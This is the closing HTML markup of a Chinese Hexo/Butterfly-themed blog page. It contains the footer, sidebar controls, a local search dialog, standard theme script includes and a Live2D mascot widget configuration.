2024-03-20 16:35:09">2024-03-20</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
